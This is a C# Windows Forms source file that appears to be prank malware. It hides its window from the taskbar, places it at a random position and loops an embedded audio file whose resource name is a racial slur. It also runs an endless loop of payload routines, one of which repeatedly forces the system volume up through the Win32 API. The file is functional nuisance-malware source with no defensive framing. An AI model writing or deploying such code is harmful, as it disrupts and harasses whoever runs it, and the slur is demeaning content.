using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.IO;
using System.Runtime.InteropServices;

// Nie zapierdalac ani uzywac w celach zjebanych
namespace Floydziak4
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        public static extern IntPtr SendMessageW(IntPtr Hwnd, int Msg, IntPtr wParam, IntPtr lParam);

        public const int APPCOMMAND_VOLUME_UP = 0xA000;
        public const int WM_APPCOMMAND = 0x319;

        public Form1()
        {
            Random random = new Random();
            int x = random.Next(0, 1140);
            int y = random.Next(0, 800);

            this.StartPosition = FormStartPosition.Manual;
            this.Location = new Point(x, y);
            this.ShowInTaskbar = false;

            InitializeComponent();

            new Thread(() =>
            {
                using (var audioStream = new MemoryStream(Properties.Resources.nigger))
                {
                    var player = new SoundPlayer(audioStream);
                    player.PlayLooping();
                }
            }).Start();
            RandomPayload();
        }

        private void RandomPayload()
        {
            Payload payload = new Payload();
            while (true)
            {
                Random random = new Random();
                int x = random.Next(1, 5);
                switch (x)
                {
                    case 1:
                        payload.payload1();
                        break;
                    case 2:
                        payload.payload2();
                        break;
                    case 3:
                        payload.InsertKremowka();
                        break;
                    case 4:
                        VOL();
                        break;
                }
                Thread.Sleep(2137);
            }
        }

        private void VOL()
        {
            for (int i = 0; i < 15; i++)
            {
                SendMessageW(this.Handle, WM_APPCOMMAND, this.Handle, (IntPtr)APPCOMMAND_VOLUME_UP);
            }
        }
    }
}

// Nie zapierdalac ani uzywac w celach zjebanych